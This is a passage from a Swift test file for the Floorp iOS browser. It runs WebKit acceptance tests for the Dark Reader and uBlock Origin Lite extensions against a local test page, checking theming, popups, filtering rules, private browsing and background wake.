// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/

import GCDWebServers
import UIKit
import WebKit
import XCTest

@testable import Client

@MainActor
final class FloorpDarkReaderWebKitAcceptanceTests: XCTestCase {
    // swiftlint:disable:next function_body_length
    func testOfficialDarkReaderAppliesThemeAndRendersInteractivePopup() async throws {
        let item = FloorpNativeWebExtensionCatalog.darkReader
        let packageURL = try ProcessInfo.processInfo.environment["FLOORP_DARKREADER_TEST_PACKAGE_PATH"]
            .map { URL(fileURLWithPath: $0) }
            ?? XCTUnwrap(item.bundledResourceURL)
        let webExtension = try await WKWebExtension(resourceBaseURL: packageURL)
        XCTAssertTrue(
            webExtension.errors.isEmpty,
            webExtension.errors.map(\.localizedDescription).joined(separator: "\n")
        )
        let context = WKWebExtensionContext(for: webExtension)
        context.uniqueIdentifier = "org.darkreader.floorp-acceptance.\(UUID().uuidString.lowercased())"
        context.baseURL = URL(string: "webkit-extension://darkreader-acceptance.floorp.internal/")!
        context.grantedPermissions = Dictionary(
            uniqueKeysWithValues: webExtension.requestedPermissions.map { ($0, Date.distantFuture) }
        )
        context.grantedPermissionMatchPatterns = Dictionary(
            uniqueKeysWithValues: webExtension.requestedPermissionMatchPatterns.map {
                ($0, Date.distantFuture)
            }
        )
        context.unsupportedAPIs = item.disabledAPIs

        // Match the shipping profile host. WebKit can report false-negative extension
        // behavior when a controller itself uses a non-persistent default data store.
        let websiteDataStore = WKWebsiteDataStore.default()
        let controllerConfiguration = WKWebExtensionController.Configuration(identifier: UUID())
        controllerConfiguration.defaultWebsiteDataStore = websiteDataStore
        let controller = WKWebExtensionController(configuration: controllerConfiguration)

        let browsingConfiguration = WKWebViewConfiguration()
        browsingConfiguration.websiteDataStore = websiteDataStore
        browsingConfiguration.webExtensionController = controller
        let browsingWebView = WKWebView(frame: .zero, configuration: browsingConfiguration)
        let tab = FloorpUBOLDiagnosticTab(webView: browsingWebView)
        let extensionWindow = FloorpUBOLDiagnosticWindow(tab: tab)
        tab.diagnosticWindow = extensionWindow
        let hostController = UIViewController()
        let hostFrame = CGRect(x: 0, y: 0, width: 390, height: 844)
        hostController.view.frame = hostFrame
        browsingWebView.frame = hostController.view.bounds
        browsingWebView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        hostController.view.addSubview(browsingWebView)
        let hostWindow: UIWindow
        if let windowScene = UIApplication.shared.connectedScenes
            .compactMap({ $0 as? UIWindowScene }).first {
            hostWindow = UIWindow(windowScene: windowScene)
            hostWindow.frame = hostFrame
        } else {
            hostWindow = UIWindow(frame: hostFrame)
        }
        hostWindow.rootViewController = hostController
        hostWindow.makeKeyAndVisible()

        let delegate = FloorpUBOLDiagnosticControllerDelegate(window: extensionWindow)
        controller.delegate = delegate
        controller.didOpenWindow(extensionWindow)
        controller.didOpenTab(tab)
        controller.didFocusWindow(extensionWindow)
        controller.didActivateTab(tab, previousActiveTab: nil)
        defer {
            FloorpWebExtensionTestRuntimeRetainer.retain(
                controller: controller,
                context: context,
                objects: [webExtension, websiteDataStore],
                resourceRoot: packageURL
            )
        }
        try controller.load(context)
        try await waitForBackgroundContent(in: context)
        print("FLOORP_DARKREADER_RELEASE_GATE background")
        var presentedPopup: UIViewController?
        var presentedPopupWebView: WKWebView?
        defer {
            presentedPopup?.dismiss(animated: false)
            presentedPopupWebView?.stopLoading()
            presentedPopupWebView?.navigationDelegate = nil
            browsingWebView.stopLoading()
            browsingWebView.navigationDelegate = nil
            controller.didCloseTab(tab, windowIsClosing: true)
            controller.didCloseWindow(extensionWindow)
            controller.delegate = nil
            hostWindow.isHidden = true
            var retainedObjects: [AnyObject] = [
                webExtension,
                browsingWebView,
                tab,
                extensionWindow,
                delegate,
                hostController,
                hostWindow
            ]
            if let presentedPopup {
                retainedObjects.append(presentedPopup)
            }
            if let presentedPopupWebView {
                retainedObjects.append(presentedPopupWebView)
            }
            FloorpWebExtensionTestRuntimeRetainer.retain(
                controller: controller,
                context: context,
                objects: retainedObjects,
                resourceRoot: packageURL
            )
        }

        let server = try Self.makeServer()
        defer { server.stop() }
        let pageURL = try XCTUnwrap(URL(string: "http://localhost:\(server.port)/"))
        let navigation = FloorpUBOLNavigationWaiter()
        do {
            try await navigation.load(pageURL, in: browsingWebView)
        } catch {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "Dark Reader page navigation failed: \(error)"
            )
        }
        print("FLOORP_DARKREADER_RELEASE_GATE navigation")
        try await waitForJavaScriptCondition(
            in: browsingWebView,
            """
            return document.documentElement.dataset.darkreaderMode === 'dynamic' &&
                document.documentElement.dataset.darkreaderScheme === 'dark' &&
                document.querySelectorAll('style.darkreader').length > 0;
            """
        )
        print("FLOORP_DARKREADER_RELEASE_GATE theme")

        let popupPresented = expectation(description: "Dark Reader popup presented")
        delegate.actionPopupHandler = { action in
            guard let popup = action.popupViewController else {
                XCTFail("Dark Reader action did not provide a popup view controller")
                return
            }
            presentedPopup = popup
            hostController.present(popup, animated: false) {
                popupPresented.fulfill()
            }
        }
        context.performAction(for: tab)
        await fulfillment(of: [popupPresented], timeout: 5)
        let popup = try XCTUnwrap(presentedPopup)
        let popupWebView = try await waitForWebView(in: popup)
        presentedPopupWebView = popupWebView
        try await waitForJavaScriptCondition(
            in: popupWebView,
            """
            return Boolean(document.querySelector('.app-switch__control')) &&
                Boolean(document.querySelector('.app-switch__control .multi-switch__option--selected')) &&
                Boolean(document.querySelector('.site-toggle.site-toggle--active')) &&
                document.querySelector('.site-toggle__url')?.textContent.includes('localhost');
            """
        )
        print("FLOORP_DARKREADER_RELEASE_GATE popup")

        try await performJavaScriptAction(
            in: popupWebView,
            """
            const toggle = document.querySelector('.site-toggle');
            if (!toggle) { throw new Error('Missing Dark Reader site toggle'); }
            toggle.click();
            return true;
            """,
        )
        try await waitForJavaScriptCondition(
            in: browsingWebView,
            "return !document.documentElement.hasAttribute('data-darkreader-mode');"
        )
        try await performJavaScriptAction(
            in: popupWebView,
            """
            const toggle = document.querySelector('.site-toggle');
            if (!toggle) { throw new Error('Missing Dark Reader site toggle'); }
            toggle.click();
            return true;
            """,
        )
        try await waitForJavaScriptCondition(
            in: browsingWebView,
            "return document.documentElement.dataset.darkreaderMode === 'dynamic';"
        )

        try await performJavaScriptAction(
            in: popupWebView,
            """
            const options = document.querySelectorAll('.app-switch__control .multi-switch__option');
            if (options.length !== 3) { throw new Error('Missing Dark Reader app switch'); }
            options[2].click();
            return true;
            """,
        )
        try await waitForJavaScriptCondition(
            in: browsingWebView,
            "return !document.documentElement.hasAttribute('data-darkreader-mode');"
        )
        try await performJavaScriptAction(
            in: popupWebView,
            """
            const options = document.querySelectorAll('.app-switch__control .multi-switch__option');
            if (options.length !== 3) { throw new Error('Missing Dark Reader app switch'); }
            options[0].click();
            return true;
            """,
        )
        try await waitForJavaScriptCondition(
            in: browsingWebView,
            "return document.documentElement.dataset.darkreaderMode === 'dynamic';"
        )
        XCTAssertTrue(
            context.errors.isEmpty,
            context.errors.map(\.localizedDescription).joined(separator: "\n")
        )
        popup.dismiss(animated: false)
        presentedPopup = nil

        // WebKit normally suspends a nonpersistent MV3 background page after about
        // 30 seconds. Floorp explicitly wakes it before allowing a fresh main-frame
        // navigation so the first content-script message reaches registered listeners.
        try await Task.sleep(nanoseconds: 35_000_000_000)
        try await waitForBackgroundContent(in: context)
        print("FLOORP_DARKREADER_RELEASE_GATE cold-preflight")
        let coldNavigation = FloorpUBOLNavigationWaiter()
        try await coldNavigation.load(
            try XCTUnwrap(URL(string: "http://localhost:\(server.port)/?cold-wake=1")),
            in: browsingWebView
        )
        try await waitForJavaScriptCondition(
            in: browsingWebView,
            "return document.documentElement.dataset.darkreaderMode === 'dynamic';"
        )
        print("FLOORP_DARKREADER_RELEASE_GATE cold-wake")

        // Re-open the Page Action after WebKit has suspended and Floorp has
        // explicitly woken the background. A real disable/re-enable is deferred
        // until the next process; exercising unload -> load here would recreate
        // the iOS 26.5 WebKit lifecycle defect that production intentionally avoids.
        let resumedPopupPresented = expectation(description: "Dark Reader resumed popup presented")
        delegate.actionPopupHandler = { action in
            guard let resumedPopup = action.popupViewController else {
                XCTFail("Dark Reader resumed action did not provide a popup view controller")
                return
            }
            presentedPopup = resumedPopup
            hostController.present(resumedPopup, animated: false) {
                resumedPopupPresented.fulfill()
            }
        }
        context.performAction(for: tab)
        await fulfillment(of: [resumedPopupPresented], timeout: 5)
        let resumedPopup = try XCTUnwrap(presentedPopup)
        let resumedPopupWebView = try await waitForWebView(in: resumedPopup)
        try await waitForJavaScriptCondition(
            in: resumedPopupWebView,
            """
            return Boolean(document.querySelector('.app-switch__control')) &&
                Boolean(document.querySelector('.site-toggle.site-toggle--active')) &&
                document.querySelector('.site-toggle__url')?.textContent.includes('localhost');
            """
        )
        XCTAssertTrue(
            context.errors.isEmpty,
            context.errors.map(\.localizedDescription).joined(separator: "\n")
        )
        resumedPopup.dismiss(animated: false)
        presentedPopup = nil
        print("FLOORP_DARKREADER_RELEASE_GATE background-resume-popup")
        withExtendedLifetime((navigation, coldNavigation)) {}
    }

    private func performJavaScriptAction(
        in webView: WKWebView,
        _ source: String
    ) async throws {
        var lastError: (any Error)?
        for _ in 0..<12 {
            do {
                _ = try await webView.evaluateJavaScript("(() => { \(source) })()")
                return
            } catch {
                lastError = error
                try await Task.sleep(nanoseconds: 250_000_000)
            }
        }
        throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
            "Dark Reader popup action failed: \(lastError?.localizedDescription ?? "none")"
        )
    }

    private func waitForBackgroundContent(in context: WKWebExtensionContext) async throws {
        try await withCheckedThrowingContinuation { continuation in
            let gate = FloorpUBOLBackgroundLoadGate(continuation: continuation)
            context.loadBackgroundContent { error in
                gate.resolve(error)
            }
            Task { @MainActor in
                try? await Task.sleep(nanoseconds: 15_000_000_000)
                gate.timeout()
            }
        }
    }

    private func waitForJavaScriptCondition(
        in webView: WKWebView,
        _ source: String
    ) async throws {
        var lastError: (any Error)?
        for attempt in 0..<60 {
            do {
                let result = try await webView.evaluateJavaScript("(() => { \(source) })()")
                    as? Bool
                if result == true {
                    return
                }
                if attempt == 0 {
                    print("FLOORP_DARKREADER_CONDITION_FIRST_RESULT \(String(describing: result))")
                }
            } catch {
                lastError = error
                if attempt == 0 {
                    print("FLOORP_DARKREADER_CONDITION_FIRST_ERROR \(error)")
                }
            }
            do {
                try await Task.sleep(nanoseconds: 250_000_000)
            } catch {
                throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                    "Dark Reader condition wait was interrupted: \(error)"
                )
            }
        }
        throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
            "Dark Reader condition did not become true: \(source); last error: "
                + "\(lastError?.localizedDescription ?? "none")"
        )
    }

    private func waitForWebView(in viewController: UIViewController) async throws -> WKWebView {
        for _ in 0..<40 {
            viewController.loadViewIfNeeded()
            if let webView = Self.firstWebView(in: viewController.view) {
                return webView
            }
            try await Task.sleep(nanoseconds: 100_000_000)
        }
        throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
            "Dark Reader popup did not create a WKWebView"
        )
    }

    private static func firstWebView(in view: UIView) -> WKWebView? {
        if let webView = view as? WKWebView { return webView }
        return view.subviews.lazy.compactMap { firstWebView(in: $0) }.first
    }

    nonisolated private static func makeServer() throws -> GCDWebServer {
        let server = GCDWebServer()
        server.addHandler(
            forMethod: "GET",
            path: "/",
            request: GCDWebServerRequest.self
        ) { _ in
            GCDWebServerDataResponse(html: """
            <!doctype html>
            <meta charset="utf-8">
            <style>html, body { background: white; color: black; }</style>
            <main><h1>Floorp Dark Reader acceptance</h1><p>Light page fixture.</p></main>
            """)
        }
        guard server.start(withPort: 0, bonjourName: nil) else {
            throw FloorpUBOLDNRDiagnosticError.runtimeServerUnavailable
        }
        return server
    }
}

@MainActor
private final class FloorpUBOLBackgroundLoadGate {
    private var continuation: CheckedContinuation<Void, any Error>?

    init(continuation: CheckedContinuation<Void, any Error>) {
        self.continuation = continuation
    }

    func resolve(_ error: (any Error)?) {
        guard let continuation else { return }
        self.continuation = nil
        if let error {
            continuation.resume(throwing: error)
        } else {
            continuation.resume()
        }
    }

    func timeout() {
        guard let continuation else { return }
        self.continuation = nil
        continuation.resume(throwing: FloorpUBOLDNRDiagnosticError.javaScriptTimedOut)
    }
}

@MainActor
final class FloorpUBOLWebKitDiagnosticsTests: XCTestCase {
    private static let optInEnvironmentKey = "FLOORP_RUN_UBOL_DNR_DIAGNOSTICS"

    func testOfficialUBOLWebKitDNRCompilerMatrixAndBisectsSingletonFailures() async throws {
        guard ProcessInfo.processInfo.environment[Self.optInEnvironmentKey] == "1" else {
            throw XCTSkip(
                "Set \(Self.optInEnvironmentKey)=1 to run the resource-intensive WebKit DNR diagnostic."
            )
        }

        let fixtureURL = try ProcessInfo.processInfo.environment["FLOORP_UBOL_TEST_PACKAGE_PATH"]
            .map { URL(fileURLWithPath: $0) }
            ?? XCTUnwrap(
                Bundle(for: Self.self).url(
                    forResource: "uBOLite-floorp-ios-2026.825.1619",
                    withExtension: "zip"
                )
            )
        let session = try await FloorpUBOLDNRDiagnosticSession(fixtureURL: fixtureURL)
        defer { session.close() }

        let report = try await session.run()
        let encoder = JSONEncoder()
        encoder.outputFormatting = [.prettyPrinted, .sortedKeys, .withoutEscapingSlashes]
        let reportData = try encoder.encode(report)
        let reportJSON = try XCTUnwrap(String(data: reportData, encoding: .utf8))

        let attachment = XCTAttachment(
            data: reportData,
            uniformTypeIdentifier: "public.json"
        )
        attachment.name = "uBOL-WebKit-DNR-diagnostic.json"
        attachment.lifetime = .keepAlways
        add(attachment)

        print("FLOORP_UBOL_DNR_DIAGNOSTIC_BEGIN")
        print(reportJSON)
        print("FLOORP_UBOL_DNR_DIAGNOSTIC_END")

        XCTAssertEqual(report.staticProbes.count, 10)
        XCTAssertTrue(report.baselineEnabledRulesets.isEmpty)
        XCTAssertTrue(
            report.runtimeVerification.succeeded,
            report.runtimeVerification.error?.message ?? "uBO Lite did not block the probe request."
        )
    }

    func testOfficialUBOLReleaseAcceptanceGates() async throws {
        guard ProcessInfo.processInfo.environment[Self.optInEnvironmentKey] == "1" else {
            throw XCTSkip(
                "Set \(Self.optInEnvironmentKey)=1 to run the resource-intensive uBO Lite release gates."
            )
        }

        let packageURL = try ProcessInfo.processInfo.environment["FLOORP_UBOL_TEST_PACKAGE_PATH"]
            .map { URL(fileURLWithPath: $0) }
            ?? XCTUnwrap(
                Bundle(for: Self.self).url(
                    forResource: "uBOLite-floorp-ios-2026.825.1619",
                    withExtension: "zip"
                )
            )
        let session = try await FloorpUBOLReleaseAcceptanceSession(packageURL: packageURL)
        defer { session.close() }

        let report = try await session.run()
        let encoder = JSONEncoder()
        encoder.outputFormatting = [.prettyPrinted, .sortedKeys, .withoutEscapingSlashes]
        let reportData = try encoder.encode(report)
        let reportJSON = try XCTUnwrap(String(data: reportData, encoding: .utf8))
        let attachment = XCTAttachment(data: reportData, uniformTypeIdentifier: "public.json")
        attachment.name = "uBOL-release-acceptance.json"
        attachment.lifetime = .keepAlways
        add(attachment)

        print("FLOORP_UBOL_RELEASE_ACCEPTANCE_BEGIN")
        print(reportJSON)
        print("FLOORP_UBOL_RELEASE_ACCEPTANCE_END")

        XCTAssertTrue(report.succeeded, report.failureSummary)
    }
}

@MainActor
private struct FloorpUBOLReleaseBrowserEnvironment {
    let normalWebView: WKWebView
    let privateWebView: WKWebView
    let normalTab: FloorpUBOLDiagnosticTab
    let privateTab: FloorpUBOLDiagnosticTab
    let normalWindow: FloorpUBOLDiagnosticWindow
    let privateWindow: FloorpUBOLDiagnosticWindow
    let hostController: UIViewController
    let hostWindow: UIWindow
    let delegate: FloorpUBOLDiagnosticControllerDelegate

    func open(using controller: WKWebExtensionController) {
        controller.delegate = delegate
        controller.didOpenWindow(normalWindow)
        controller.didOpenTab(normalTab)
        controller.didOpenWindow(privateWindow)
        controller.didOpenTab(privateTab)
        controller.didFocusWindow(normalWindow)
        controller.didActivateTab(normalTab, previousActiveTab: nil)
    }

    func close(using controller: WKWebExtensionController) {
        normalWebView.stopLoading()
        normalWebView.navigationDelegate = nil
        privateWebView.stopLoading()
        privateWebView.navigationDelegate = nil
        controller.didCloseTab(normalTab, windowIsClosing: true)
        controller.didCloseWindow(normalWindow)
        controller.didCloseTab(privateTab, windowIsClosing: true)
        controller.didCloseWindow(privateWindow)
        controller.delegate = nil
        hostWindow.isHidden = true
    }
}

@MainActor
private final class FloorpUBOLReleaseAcceptanceSession {
    private static let defaultRulesets = ["ublock-filters", "easylist", "easyprivacy"]
    private static let japaneseRuleset = "jpn-1"
    private static let expectedDefaultRuleCount = 113_100
    private static let expectedJapaneseRuleCount = 1_906
    private static let dynamicRuleID = 2_000_000_001
    private static let sessionRuleID = 2_000_000_002

    private let webExtension: WKWebExtension
    private let context: WKWebExtensionContext
    private let controller: WKWebExtensionController
    private let websiteDataStore: WKWebsiteDataStore
    private let resourceRoot: URL
    private var retainedExtensionWebView: WKWebView?
    private var extensionNavigationWaiter: FloorpUBOLNavigationWaiter?
    private var retainedRuntimeObjects = [AnyObject]()

    private var extensionWebView: WKWebView {
        guard let retainedExtensionWebView else {
            preconditionFailure("The uBO Lite extension page has already been retired")
        }
        return retainedExtensionWebView
    }

    init(packageURL: URL) async throws {
        self.resourceRoot = packageURL
        let webExtension = try await WKWebExtension(resourceBaseURL: packageURL)
        guard webExtension.errors.isEmpty else {
            throw FloorpUBOLDNRDiagnosticError.packageErrors(
                webExtension.errors.map(\.localizedDescription)
            )
        }
        self.webExtension = webExtension

        let token = UUID().uuidString.lowercased()
        let contextIdentifier = "org.ublockorigin.lite.floorp-release-acceptance.\(token)"
        FloorpNativeWebExtensionCatalog.registerBaseURLSchemes()
        let baseURL = URL(
            string: "safari-web-extension://ubol-release-\(token).floorp.internal/"
        )!
        let context = Self.makeContext(
            webExtension: webExtension,
            identifier: contextIdentifier,
            baseURL: baseURL,
            privateAccess: true
        )
        self.context = context

        let websiteDataStore = WKWebsiteDataStore.default()
        self.websiteDataStore = websiteDataStore
        let configuration = WKWebExtensionController.Configuration(identifier: UUID())
        configuration.defaultWebsiteDataStore = websiteDataStore
        let controller = WKWebExtensionController(configuration: configuration)
        self.controller = controller
    }

    func close() {
        retainedExtensionWebView?.stopLoading()
        retainedExtensionWebView?.navigationDelegate = nil
        controller.delegate = nil
        var objects: [AnyObject] = [webExtension, websiteDataStore]
        objects.append(contentsOf: retainedRuntimeObjects)
        if let retainedExtensionWebView {
            objects.append(retainedExtensionWebView)
        }
        if let extensionNavigationWaiter {
            objects.append(extensionNavigationWaiter)
        }
        FloorpWebExtensionTestRuntimeRetainer.retain(
            controller: controller,
            context: context,
            objects: objects,
            resourceRoot: resourceRoot
        )
        retainedExtensionWebView = nil
        extensionNavigationWaiter = nil
        retainedRuntimeObjects.removeAll()
    }

    func run() async throws -> FloorpUBOLReleaseAcceptanceReport {
        print("FLOORP_UBOL_RELEASE_GATE server")
        let server = try Self.makeServer()
        defer { server.stop() }

        // Floorp restores enabled contexts before a scene publishes ordinary
        // browsing WebViews. On iOS 26, opening those tabs before loading the
        // context can make WebKit fail an extension-page navigation through its
        // private Gestures state machine (`failed(deinit)`). Keep this gate on
        // the same lifecycle order as the production host.
        try controller.load(context)
        // Create the release gate's extension-page driver from the clean
        // post-load configuration before explicitly waking the nonpersistent
        // MV3 background. The page's readiness request performs the first wake;
        // constructing the first detached extension page after that wake hits
        // an iOS 26 WebKit Gestures invalid transition. Real Floorp surfaces are
        // attached to a window and are covered by the production-host tests.
        print("FLOORP_UBOL_RELEASE_GATE context-loaded")
        let readyPage = try await Self.makeReadyExtensionPage(
            context: context,
            baseURL: context.baseURL
        )
        print("FLOORP_UBOL_RELEASE_GATE extension-page-ready")
        retainedExtensionWebView = readyPage.webView
        extensionNavigationWaiter = readyPage.waiter
        try await Self.loadBackgroundContent(in: context)
        print("FLOORP_UBOL_RELEASE_GATE background-loaded")

        let browser = makeBrowserEnvironment()
        browser.open(using: controller)
        defer { browser.close(using: controller) }
        let normalWebView = browser.normalWebView
        let privateWebView = browser.privateWebView
        let normalTab = browser.normalTab
        let privateTab = browser.privateTab
        let normalWindow = browser.normalWindow
        let privateWindow = browser.privateWindow

        print("FLOORP_UBOL_RELEASE_GATE optimal-config")
        let optimalLevel = try await configureOptimalMode()
        let optimalScriptIDs = try await registeredContentScriptIDs()
        let normalURL = URL(string: "http://localhost:\(server.port)/")!
        print("FLOORP_UBOL_RELEASE_GATE optimal-page")
        let optimal = try await loadAndInspect(normalURL, in: normalWebView)
        print("FLOORP_UBOL_RELEASE_GATE popup")
        let popup = try await inspectActionPopup(pageURL: normalURL, in: browser)

        print("FLOORP_UBOL_RELEASE_GATE dynamic-session")
        let dnrRuleCounts = try await addDynamicAndSessionRules()
        let dynamicAndSession = try await loadAndInspect(normalURL, in: normalWebView)

        print("FLOORP_UBOL_RELEASE_GATE strict-block")
        let strictBlock = try await strictBlockStatus()

        print("FLOORP_UBOL_RELEASE_GATE complete")
        let completeLevel = try await setDefaultFilteringMode(3)
        let completeScriptIDs = try await waitForRegisteredContentScripts(
            containing: ["css-generic-all", "css-specific", "css-user", "ublock-filters.main"]
        )
        let completeScriptRegistrations = try await registeredContentScriptRegistrations()
        let complete = try await loadAndInspect(normalURL, in: normalWebView)

        print("FLOORP_UBOL_RELEASE_GATE japanese")
        let enabledWithJapanese = try await applyRulesets(
            Self.defaultRulesets + [Self.japaneseRuleset]
        )
        let ruleCountsAfterRulesetUpdate = try await acceptanceDNRRuleCounts()
        let restoredSessionRuleCount = try await restoreAcceptanceSessionRule()
        let japaneseScriptIDs = try await waitForRegisteredContentScripts(
            containing: ["jpn-1.main", "jpn-1.isolated"]
        )
        let japaneseScriptRegistrations = try await registeredContentScriptRegistrations()
        let japanese = try await loadAndInspect(normalURL, in: normalWebView)

        print("FLOORP_UBOL_RELEASE_GATE private")
        normalWebView.isHidden = true
        privateWebView.isHidden = false
        controller.didFocusWindow(privateWindow)
        controller.didActivateTab(privateTab, previousActiveTab: nil)
        let privateBrowsing = try await loadAndInspect(normalURL, in: privateWebView)
        privateWebView.isHidden = true
        normalWebView.isHidden = false
        controller.didFocusWindow(normalWindow)
        controller.didActivateTab(normalTab, previousActiveTab: nil)

        print("FLOORP_UBOL_RELEASE_GATE background-wake")
        try await removeAcceptanceDNRRules()
        let backgroundWake = try await verifyBackgroundWakePreservesState()
        print("FLOORP_UBOL_RELEASE_GATE report")

        withExtendedLifetime(browser) {}
        return FloorpUBOLReleaseAcceptanceReport(
            schemaVersion: 1,
            operatingSystem: ProcessInfo.processInfo.operatingSystemVersionString,
            webKitBundleVersion: Bundle(for: WKWebView.self)
                .object(forInfoDictionaryKey: "CFBundleVersion") as? String ?? "unknown",
            packageVersion: webExtension.version ?? "unknown",
            defaultStaticRuleCount: Self.expectedDefaultRuleCount,
            japaneseStaticRuleCount: Self.expectedJapaneseRuleCount,
            optimalFilteringLevel: optimalLevel,
            completeFilteringLevel: completeLevel,
            optimalRegisteredContentScripts: optimalScriptIDs,
            completeRegisteredContentScripts: completeScriptIDs,
            completeContentScriptRegistrations: completeScriptRegistrations,
            japaneseRegisteredContentScripts: japaneseScriptIDs,
            japaneseContentScriptRegistrations: japaneseScriptRegistrations,
            enabledRulesetsWithJapanese: enabledWithJapanese,
            dynamicRuleCount: dnrRuleCounts.dynamic,
            sessionRuleCount: dnrRuleCounts.session,
            dynamicRuleCountAfterRulesetUpdate: ruleCountsAfterRulesetUpdate.dynamic,
            sessionRuleCountAfterRulesetUpdate: ruleCountsAfterRulesetUpdate.session,
            restoredSessionRuleCount: restoredSessionRuleCount,
            strictBlock: strictBlock,
            popup: popup,
            optimal: optimal,
            dynamicAndSession: dynamicAndSession,
            complete: complete,
            japanese: japanese,
            privateBrowsing: privateBrowsing,
            backgroundWake: backgroundWake,
            contextErrors: context.errors.map(FloorpUBOLDNRErrorRecord.init)
        )
    }

    private func inspectActionPopup(
        pageURL: URL,
        in browser: FloorpUBOLReleaseBrowserEnvironment
    ) async throws -> FloorpUBOLPopupAcceptance {
        _ = try await loadAndInspect(pageURL, in: browser.privateWebView)
        browser.normalWebView.isHidden = false
        browser.privateWebView.isHidden = true
        let normal = try await inspectActionPopup(
            for: browser.normalTab,
            in: browser.normalWindow,
            browser: browser
        )
        browser.normalWebView.isHidden = true
        browser.privateWebView.isHidden = false
        let privateBrowsing = try await inspectActionPopup(
            for: browser.privateTab,
            in: browser.privateWindow,
            browser: browser
        )
        browser.privateWebView.isHidden = true
        browser.normalWebView.isHidden = false
        browser.delegate.focusedWindow = browser.normalWindow
        controller.didFocusWindow(browser.normalWindow)
        controller.didActivateTab(browser.normalTab, previousActiveTab: nil)
        let matchedRulesRouting = try await inspectMatchedRulesRouting(in: browser)
        return FloorpUBOLPopupAcceptance(
            loadingCleared: true,
            hostname: normal.hostname,
            filteringLevel: normal.filteringLevel,
            matchedRulesEnabled: normal.matchedRulesEnabled,
            privateLoadingCleared: true,
            privateHostname: privateBrowsing.hostname,
            privateFilteringLevel: privateBrowsing.filteringLevel,
            privateMatchedRulesEnabled: privateBrowsing.matchedRulesEnabled,
            matchedRulesRouting: matchedRulesRouting
        )
    }

    private func inspectActionPopup(
        for tab: FloorpUBOLDiagnosticTab,
        in window: FloorpUBOLDiagnosticWindow,
        browser: FloorpUBOLReleaseBrowserEnvironment
    ) async throws -> FloorpUBOLPopupWindowAcceptance {
        var popupViewController: UIViewController?
        var popupWebView: WKWebView?
        browser.delegate.actionPopupHandler = { action in
            guard let popup = action.popupViewController else { return }
            popupViewController = popup
            browser.hostController.present(popup, animated: false)
        }
        defer {
            popupViewController?.dismiss(animated: false)
            popupWebView?.stopLoading()
            popupWebView?.navigationDelegate = nil
            browser.delegate.actionPopupHandler = nil
            if let popupViewController {
                retainedRuntimeObjects.append(popupViewController)
            }
            if let popupWebView {
                retainedRuntimeObjects.append(popupWebView)
            }
        }
        browser.delegate.focusedWindow = window
        controller.didFocusWindow(window)
        controller.didActivateTab(tab, previousActiveTab: nil)
        context.performAction(for: tab)

        for _ in 0..<40 {
            if let popupViewController {
                popupViewController.loadViewIfNeeded()
                popupWebView = Self.firstWebView(in: popupViewController.view)
            }
            if popupWebView != nil { break }
            try await Task.sleep(nanoseconds: 100_000_000)
        }
        guard let popupWebView else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "uBO Lite action did not present a popup WKWebView"
            )
        }

        for _ in 0..<60 {
            let raw = try? await popupWebView.floorpCallAsyncJavaScript(
                """
                return {
                    loading: document.body.classList.contains('loading'),
                    hostname: document.querySelector('#hostname')?.textContent
                        .replaceAll(String.fromCharCode(0x00ad), '') || '',
                    level: document.querySelector('.filteringModeSlider')?.dataset.level || '',
                    matchedRulesEnabled: document.querySelector('#gotoMatchedRules')
                        ?.classList.contains('enabled') === true
                };
                """,
                contentWorld: .page,
                timeoutNanoseconds: 5_000_000_000
            ) as? [String: Any]
            if let raw,
               raw["loading"] as? Bool == false,
               raw["hostname"] as? String == "localhost",
               let levelString = raw["level"] as? String,
               let level = Int(levelString),
               let matchedRulesEnabled = raw["matchedRulesEnabled"] as? Bool {
                return FloorpUBOLPopupWindowAcceptance(
                    hostname: "localhost",
                    filteringLevel: level,
                    matchedRulesEnabled: matchedRulesEnabled
                )
            }
            try await Task.sleep(nanoseconds: 250_000_000)
        }
        throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
            "uBO Lite popup did not resolve the active localhost tab"
        )
    }

    private func inspectMatchedRulesRouting(
        in browser: FloorpUBOLReleaseBrowserEnvironment
    ) async throws -> FloorpUBOLMatchedRulesRoutingAcceptance {
        defer { browser.delegate.openNewTabHandler = nil }
        let normal = try await requestMatchedRulesWindow(
            isPrivate: false,
            window: browser.normalWindow,
            tab: browser.normalTab,
            browser: browser
        )
        let privateBrowsing = try await requestMatchedRulesWindow(
            isPrivate: true,
            window: browser.privateWindow,
            tab: browser.privateTab,
            browser: browser
        )
        controller.didFocusWindow(browser.normalWindow)
        controller.didActivateTab(browser.normalTab, previousActiveTab: nil)
        browser.delegate.focusedWindow = browser.normalWindow
        return FloorpUBOLMatchedRulesRoutingAcceptance(
            normal: normal,
            privateBrowsing: privateBrowsing
        )
    }

    private func requestMatchedRulesWindow(
        isPrivate: Bool,
        window: FloorpUBOLDiagnosticWindow,
        tab: FloorpUBOLDiagnosticTab,
        browser: FloorpUBOLReleaseBrowserEnvironment
    ) async throws -> FloorpUBOLMatchedRulesWindowAcceptance {
        var requestedPrivate: Bool?
        var requestedURLs: [String]?
        browser.delegate.openNewTabHandler = { configuration in
            guard configuration.window as AnyObject? === window,
                  configuration.shouldBeActive,
                  let url = configuration.url else {
                return nil
            }
            requestedPrivate = window.isPrivateBrowsing
            requestedURLs = [url.absoluteString]
            return window.tab
        }
        browser.delegate.focusedWindow = window
        controller.didFocusWindow(window)
        controller.didActivateTab(tab, previousActiveTab: nil)

        let raw = try await extensionWebView.floorpCallAsyncJavaScript(
            """
            const [tab] = await browser.tabs.query({ active: true, currentWindow: true });
            if ( tab instanceof Object === false || typeof tab.id !== 'number' ) {
                throw new Error('uBO Lite could not resolve the active tab for matched rules');
            }
            if ( tab.incognito !== expectedPrivate ) {
                throw new Error(`Unexpected active-tab privacy: ${tab.incognito}`);
            }
            if ( typeof tab.windowId !== 'number' ) {
                throw new Error('uBO Lite could not resolve the active window for matched rules');
            }
            const response = await browser.runtime.sendMessage({
                what: 'showMatchedRules',
                tabId: tab.id,
                windowId: tab.windowId,
                incognito: tab.incognito === true,
            });
            if ( response?.opened !== true ) {
